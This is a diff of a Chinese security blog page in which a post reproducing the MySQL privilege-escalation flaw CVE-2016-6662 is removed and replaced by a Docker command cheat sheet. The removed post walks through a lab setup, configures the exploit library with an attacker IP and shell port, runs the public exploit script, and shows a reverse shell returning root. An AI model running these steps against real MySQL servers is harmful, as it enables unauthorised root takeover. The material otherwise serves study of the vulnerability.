@@ -83,7 +83,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="mysql,code execution," />
+  <meta name="keywords" content="docker,linux," />
 
 
 
@@ -99,31 +99,22 @@
 
 
 
-<meta name="description" content="概述最近出了一个mysql提权漏洞，趁热练练手。
-利用前提
-mysql_hookandroot_lib.c
-mysql拥有my.cnf写权限
-mysql root用户可执行 set global general_log_file = &amp;#39;my.cnf&amp;#39;; sql语句
-需要file权限">
+<meta name="description" content="概述Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。
+详情创建镜像创建镜像的方法有很多，官方推荐的是直接从官网仓库pull一个，虽然官方的镜像很小，但一些基础的如ping这样的工具都没有安装，所以我选择 openvz的模板 
+123456#">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Mysql 提权漏洞 CVE-2016-6662">
-<meta property="og:url" content="http://orleven.com/2016/09/29/mysql-root-code-execution-CVE-2016-6662/index.html">
+<meta property="og:title" content="Docker 学习">
+<meta property="og:url" content="http://orleven.com/2016/11/22/docker/index.html">
 <meta property="og:site_name" content="Orleven Blog">
-<meta property="og:description" content="概述最近出了一个mysql提权漏洞，趁热练练手。
-利用前提
-mysql_hookandroot_lib.c
-mysql拥有my.cnf写权限
-mysql root用户可执行 set global general_log_file = &amp;#39;my.cnf&amp;#39;; sql语句
-需要file权限">
-<meta property="og:updated_time" content="2017-03-14T06:37:42.505Z">
+<meta property="og:description" content="概述Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。
+详情创建镜像创建镜像的方法有很多，官方推荐的是直接从官网仓库pull一个，虽然官方的镜像很小，但一些基础的如ping这样的工具都没有安装，所以我选择 openvz的模板 
+123456#">
+<meta property="og:updated_time" content="2017-03-14T12:57:44.144Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Mysql 提权漏洞 CVE-2016-6662">
-<meta name="twitter:description" content="概述最近出了一个mysql提权漏洞，趁热练练手。
-利用前提
-mysql_hookandroot_lib.c
-mysql拥有my.cnf写权限
-mysql root用户可执行 set global general_log_file = &amp;#39;my.cnf&amp;#39;; sql语句
-需要file权限">
+<meta name="twitter:title" content="Docker 学习">
+<meta name="twitter:description" content="概述Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。
+详情创建镜像创建镜像的方法有很多，官方推荐的是直接从官网仓库pull一个，虽然官方的镜像很小，但一些基础的如ping这样的工具都没有安装，所以我选择 openvz的模板 
+123456#">
 
 
 
@@ -151,13 +142,13 @@ mysql root用户可执行 set global general_log_file = &amp;#39;my.cnf&amp;#39;
 
 
 
-  <link rel="canonical" href="http://orleven.com/2016/09/29/mysql-root-code-execution-CVE-2016-6662/"/>
+  <link rel="canonical" href="http://orleven.com/2016/11/22/docker/"/>
 
 
 
 
 
-  <title> Mysql 提权漏洞 CVE-2016-6662 | Orleven Blog </title>
+  <title> Docker 学习 | Orleven Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -330,7 +321,7 @@ mysql root用户可执行 set global general_log_file = &amp;#39;my.cnf&amp;#39;
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://orleven.com/2016/09/29/mysql-root-code-execution-CVE-2016-6662/">
+    <link itemprop="mainEntityOfPage" href="http://orleven.com/2016/11/22/docker/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Orleven">
@@ -351,7 +342,7 @@ mysql root用户可执行 set global general_log_file = &amp;#39;my.cnf&amp;#39;
             
             
               
-                Mysql 提权漏洞 CVE-2016-6662
+                Docker 学习
               
             
           </h1>
@@ -366,8 +357,8 @@ mysql root用户可执行 set global general_log_file = &amp;#39;my.cnf&amp;#39;
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-09-29T19:54:12+08:00">
-                2016-09-29
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-11-22T03:22:12+08:00">
+                2016-11-21
               </time>
             
 
@@ -389,8 +380,8 @@ mysql root用户可执行 set global general_log_file = &amp;#39;my.cnf&amp;#39;
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/root-code-execution/" itemprop="url" rel="index">
-                    <span itemprop="name">root code execution</span>
+                  <a href="/categories/docker/" itemprop="url" rel="index">
+                    <span itemprop="name">docker</span>
                   </a>
                 </span>
 
@@ -424,26 +415,11 @@ mysql root用户可执行 set global general_log_file = &amp;#39;my.cnf&amp;#39;
       
 
       
-        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>最近出了一个mysql提权漏洞，趁热练练手。</p>
-<h1 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h1><ul>
-<li>mysql_hookandroot_lib.c</li>
-<li>mysql拥有my.cnf写权限</li>
-<li>mysql root用户可执行 <code>set global general_log_file = &#39;my.cnf&#39;;</code> sql语句</li>
-<li>需要file权限</li>
-</ul>
-<a id="more"></a>
-<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="安装mysql-5-6-32"><a href="#安装mysql-5-6-32" class="headerlink" title="安装mysql 5.6.32"></a>安装mysql 5.6.32</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">$ wget http://ftp.kaist.ac.kr/mysql/Downloads/MySQL-5.6/mysql-5.6.32-linux-glibc2.5-x86_64.tar.gz</div><div class="line">$ sudo apt-get install libaio-dev（或者libaio1）    </div><div class="line">$ chmod 777 tmp</div><div class="line">$ groupadd  mysql</div><div class="line">$ useradd -r -g mysql mysql</div><div class="line">$ <span class="built_in">cd</span> /usr/<span class="built_in">local</span>/</div><div class="line">$ tar zxvf /tmp/mysql-5.6.32-linux-glibc2.5-x86_64.tar.gz </div><div class="line">$ ln <span class="_">-s</span> mysql-5.6.32-linux-glibc2.5-x86_64 mysql</div><div class="line">$ <span class="built_in">cd</span> mysql </div><div class="line">$ chown -R mysql .</div><div class="line">$ chgrp -R mysql .</div><div class="line">$ scripts/mysql_install_db  --user=mysql</div><div class="line">$ chown -R root .</div><div class="line">$ chown -R mysql data</div><div class="line">$ cp my.cnf  /etc/my.cnf</div><div class="line">$ bin/mysqld_safe --user=mysql &amp;</div><div class="line">$ cp support-files/mysql.server  /etc/init.d/mysql.server</div><div class="line">$ ./bin/mysqladmin -u root password <span class="string">'123456'</span></div><div class="line">$ ./bin/mysqladmin -uroot -p123456 shutdown</div><div class="line">$ bin/mysqld_safe --user=mysql &amp;</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 如果想在任何地方都能直接使用mysql命令，需要设置环境变量：</span></div><div class="line">$ vi /etc/environment   <span class="comment"># 在PATH=“…”最后添加mysql可执行文件所在路径（在这里是:/usr/local/mysql/bin）</span></div><div class="line">$ <span class="built_in">source</span> /etc/environment</div></pre></td></tr></table></figure>
-<h2 id="版本信息"><a href="#版本信息" class="headerlink" title="版本信息"></a>版本信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">$ lsb_release <span class="_">-a</span></div><div class="line">No LSB modules are available.</div><div class="line">Distributor ID:	Ubuntu</div><div class="line">Description:	Ubuntu 14.04.4 LTS</div><div class="line">Release:	14.04</div><div class="line">Codename:	trusty</div><div class="line"></div><div class="line"></div><div class="line">$ ./bin/mysqladmin -u root -p version</div><div class="line">Enter password: </div><div class="line">./bin/mysqladmin  Ver 8.42 Distrib 5.6.32, <span class="keyword">for</span> linux-glibc2.5 on x86_64</div><div class="line">Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.</div><div class="line"></div><div class="line">Oracle is a registered trademark of Oracle Corporation and/or its</div><div class="line">affiliates. Other names may be trademarks of their respective</div><div class="line">owners.</div><div class="line"></div><div class="line">Server version		5.6.32</div><div class="line">Protocol version	10</div><div class="line">Connection		Localhost via UNIX socket</div><div class="line">UNIX socket		/tmp/mysql.sock</div><div class="line">Uptime:			2 min 54 sec</div><div class="line"></div><div class="line">Threads: 1  Questions: 10  Slow queries: 0  Opens: 67  Flush tables: 1  Open tables: 60  Queries per second avg: 0.057</div></pre></td></tr></table></figure>
-<h2 id="进程属性"><a href="#进程属性" class="headerlink" title="进程属性"></a>进程属性</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ ps -aux | grep mysql</div><div class="line">root        23  0.0  0.0   4440   748 ?        S    10:02   0:00 /bin/sh bin/mysqld_safe --user=mysql</div><div class="line">mysql      122 13.0 45.0 985540 457724 ?       Sl   10:02   0:00 /usr/<span class="built_in">local</span>/mysql/bin/mysqld --basedir=/usr/<span class="built_in">local</span>/mysql --datadir=/usr/<span class="built_in">local</span>/mysql/data --plugin-dir=/usr/<span class="built_in">local</span>/mysql/lib/plugin --user=mysql --log-error=/usr/<span class="built_in">local</span>/mysql/data/d1190820d670.err --pid-file=/usr/<span class="built_in">local</span>/mysql/data/d1190820d670.pid</div></pre></td></tr></table></figure>
-<p>可以看出，mysqld_safe封装脚本是以root权限启动的，而主要的mysqld进程是用较低权限的mysql用户启动的。</p>
-<h1 id="复现准备"><a href="#复现准备" class="headerlink" title="复现准备"></a>复现准备</h1><p>修改my.cnf权限<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 将/usr/local/mysql/my.cnf</span></div><div class="line">$ chown mysql:mysql /usr/<span class="built_in">local</span>/mysql/my.cnf</div></pre></td></tr></table></figure></p>
-<p>创建attacker用户，并赋予file，select，insert权限，创建用于实验的数据库pocdb<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">CREATE DATABASE pocdb;</div><div class="line">GRANT FILE ON *.* TO <span class="string">'attacker'</span>@<span class="string">'%'</span> IDENTIFIED BY <span class="string">'p0cpass!'</span>;</div><div class="line">GRANT SELECT, INSERT, CREATE ON `pocdb`.* TO <span class="string">'attacker'</span>@<span class="string">'%'</span>;</div></pre></td></tr></table></figure></p>
-<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>修改一下<code>mysql_hookandroot_lib.c</code>的ip，port和my.cnf的位置：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> ATTACKERS_IP <span class="meta-string">"192.168.0.1"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> SHELL_PORT 6033</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INJECTED_CONF <span class="meta-string">"/usr/local/mysql/my.cnf"</span></span></div></pre></td></tr></table></figure></p>
-<p>修改一下<code>0ldSQL_MySQL_RCE_exploit.py</code>的port和my.cnf的位置,然后执行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ python 0ldSQL_MySQL_RCE_exploit.py -dbuser attacker -dbpass <span class="string">'p0cpass!'</span> -dbhost 192.168.0.1 -dbname pocdb -mycnf /usr/<span class="built_in">local</span>/mysql/my.cnf</div></pre></td></tr></table></figure></p>
-<p>执行成功后会在my.cnf里添加如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">/usr/<span class="built_in">local</span>/mysql/bin/mysqld, Version: 5.6.32 (MySQL Community Server (GPL)). started with:</div><div class="line">Tcp port: 3306  Unix socket: /tmp/mysql.sock</div><div class="line">Time                 Id Command    Argument</div><div class="line">160929  9:37:14     1 Query     select <span class="string">"</span></div><div class="line"></div><div class="line"># 0ldSQL_MySQL_RCE_exploit got here :)</div><div class="line"></div><div class="line">[mysqld]</div><div class="line">malloc_lib='/usr/local/mysql/data/mysql_hookandroot_lib.so'</div><div class="line"></div><div class="line">[abyss]</div><div class="line">" INTO void</div><div class="line">                    1 Query     SET global general_log = off</div></pre></td></tr></table></figure></p>
-<p>虽然直接把日志写在<code>my.cnf</code>里重启mysql时会执行失败，但是不用担心,config_cleanup() 这个函数会清除这些。  </p>
-<p>重启mysql<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Listening on [0.0.0.0] (family 0, port 12344)</div><div class="line">Connection from [192.168.0.4] port 12344 [tcp/*] accepted (family 2, sport 34434)</div><div class="line">whoami</div><div class="line">root</div></pre></td></tr></table></figure></p>
-
+        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。</p>
+<h1 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h1><h2 id="创建镜像"><a href="#创建镜像" class="headerlink" title="创建镜像"></a>创建镜像</h2><p>创建镜像的方法有很多，官方推荐的是直接从官网仓库pull一个，虽然官方的镜像很小，但一些基础的如ping这样的工具都没有安装，所以我选择 <a href="https://download.openvz.org/template/precreated/" target="_blank" rel="external">openvz的模板</a> </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 下载模板</span></div><div class="line">$ wget http://download.openvz.org/template/precreated/ubuntu-14.04-x86_64.tar.gz</div><div class="line"><span class="comment"># 导入镜像（由于是网上找的，记得更新源）</span></div><div class="line">$ docker import ubuntu-14.04-x86_64.tar.gz ubuntu:base</div><div class="line"><span class="comment"># 查看镜像</span></div><div class="line">$ docker images</div></pre></td></tr></table></figure>
+<h2 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 进入虚拟机</span></div><div class="line">$ docker run -t -i ubuntu:base /bin/bash</div><div class="line">$ docker run -v /home/orleven/docker/common:/tmp -t -i orleven/base:ubuntu_14.04 /bin/bash</div><div class="line"></div><div class="line"><span class="comment"># 后台运行容器</span></div><div class="line">$ Ctrl-P + Ctrl-Q</div><div class="line"></div><div class="line"><span class="comment"># 保存容器为镜像</span></div><div class="line">$ docker commit -m <span class="string">"ubuntu_base"</span> <span class="_">-a</span> <span class="string">"orleven"</span> 942   orleven/base:ubuntu_14.04</div><div class="line"></div><div class="line"><span class="comment"># 登陆hub</span></div><div class="line">$ docker login -u orleven</div><div class="line"></div><div class="line"><span class="comment"># 将某一个镜像发布到官方网站。</span></div><div class="line">$ docker push (镜像名:tag)</div><div class="line"></div><div class="line"><span class="comment"># 进入容器</span></div><div class="line">$ docker attach 432</div><div class="line"></div><div class="line"><span class="comment"># 运行容器</span></div><div class="line">$ docker start id</div><div class="line"></div><div class="line"><span class="comment"># 下载一个ubuntu镜像</span></div><div class="line">$ docker pull (镜像名:tag)</div><div class="line"></div><div class="line"><span class="comment"># 挂载文件夹  端口映射  镜像名</span></div><div class="line">$ docker run -v /home/orleven/docker/web1:/opt/lampp/htdocs -it -p 9001:80 ubuntu:latest</div><div class="line">$ docker run -v /home/orleven/docker/common:/tmp/ -it -p 9001:80 ubuntu</div><div class="line"></div><div class="line"><span class="comment"># 可以列出所有安装过的镜像。</span></div><div class="line">$ docker images</div><div class="line"></div><div class="line"><span class="comment"># 查看正在运行的容器</span></div><div class="line">$ docker ps</div><div class="line"></div><div class="line"><span class="comment"># 查看更详细的关于某一个容器的信息。</span></div><div class="line">$ docker inspect efe(id 前三位)</div><div class="line"></div><div class="line"><span class="comment"># 在learn/tutorial镜像里面安装ping程序。(必须带上y)</span></div><div class="line">$ docker run learn/tutorial apt-get install -y ping</div><div class="line"></div><div class="line"><span class="comment"># 查看版本</span></div><div class="line">$ docker version         </div><div class="line"></div><div class="line"><span class="comment"># 搜索镜像           </span></div><div class="line">$ docker search 镜像名字     </div><div class="line"></div><div class="line"><span class="comment"># 查看日志</span></div><div class="line">$ docker logs</div><div class="line"></div><div class="line"><span class="comment"># 假设我们要导出的镜像名为orleven/base:ubuntu_14.04   </span></div><div class="line">docker save -o ubuntu14.04_base.tar.gz orleven/base:ubuntu_14.04   </div><div class="line"></div><div class="line"><span class="comment"># 保存镜像至ubuntu14.04_base.tar.gz的文件。这需要一点时间。</span></div><div class="line">$ docker <span class="built_in">export</span> f6c &gt; ./ubuntu14.04_base.tar.gz</div></pre></td></tr></table></figure>
+<h2 id="特殊指令组合"><a href="#特殊指令组合" class="headerlink" title="特殊指令组合"></a>特殊指令组合</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">使用`docker logs`快速查看`access.log`</div><div class="line">$ docker attach 432</div><div class="line">$ tail <span class="_">-f</span> access.log</div><div class="line">$ ctul + p  ctul + q</div><div class="line">$ docker logs</div><div class="line"></div><div class="line">清空none</div><div class="line">$ docker ps <span class="_">-a</span> | grep <span class="string">"Exited"</span> | awk <span class="string">'&#123;print $1 &#125;'</span>|xargs docker stop</div><div class="line">$ docker ps <span class="_">-a</span> | grep <span class="string">"Exited"</span> | awk <span class="string">'&#123;print $1 &#125;'</span>|xargs docker rm</div><div class="line">$ docker images|grep none|awk <span class="string">'&#123;print $3 &#125;'</span>|xargs docker rmi</div></pre></td></tr></table></figure>
       
     </div>
 
@@ -472,9 +448,9 @@ mysql root用户可执行 set global general_log_file = &amp;#39;my.cnf&amp;#39;
       
         <div class="post-tags">
           
-            <a href="/tags/mysql/" rel="tag"># mysql</a>
+            <a href="/tags/docker/" rel="tag"># docker</a>
           
-            <a href="/tags/code-execution/" rel="tag"># code execution</a>
+            <a href="/tags/linux/" rel="tag"># linux</a>
           
         </div>
       
@@ -487,8 +463,8 @@ mysql root用户可执行 set global general_log_file = &amp;#39;my.cnf&amp;#39;
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/09/27/kali-information-gathering/" rel="next" title="Kali Information Gathering">
-                <i class="fa fa-chevron-left"></i> Kali Information Gathering
+              <a href="/2016/10/31/php-RFI-LFI-protocol/" rel="next" title="PHP文件包含以及部分封装协议的学习">
+                <i class="fa fa-chevron-left"></i> PHP文件包含以及部分封装协议的学习
               </a>
             
           </div>
@@ -496,10 +472,6 @@ mysql root用户可执行 set global general_log_file = &amp;#39;my.cnf&amp;#39;
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2016/10/09/php-serialize-magic/" rel="prev" title="php 序列化以及 magic 学习">
-                php 序列化以及 magic 学习 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -648,7 +620,7 @@ mysql root用户可执行 set global general_log_file = &amp;#39;my.cnf&amp;#39;
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#概述"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用前提"><span class="nav-number">2.</span> <span class="nav-text">利用前提</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#环境搭建"><span class="nav-number">3.</span> <span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#安装mysql-5-6-32"><span class="nav-number">3.1.</span> <span class="nav-text">安装mysql 5.6.32</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#版本信息"><span class="nav-number">3.2.</span> <span class="nav-text">版本信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#进程属性"><span class="nav-number">3.3.</span> <span class="nav-text">进程属性</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#复现准备"><span class="nav-number">4.</span> <span class="nav-text">复现准备</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#复现"><span class="nav-number">5.</span> <span class="nav-text">复现</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#概述"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#详情"><span class="nav-number">2.</span> <span class="nav-text">详情</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#创建镜像"><span class="nav-number">2.1.</span> <span class="nav-text">创建镜像</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常用指令"><span class="nav-number">2.2.</span> <span class="nav-text">常用指令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#特殊指令组合"><span class="nav-number">2.3.</span> <span class="nav-text">特殊指令组合</span></a></li></ol></li></ol></div>
             
 
           </div>
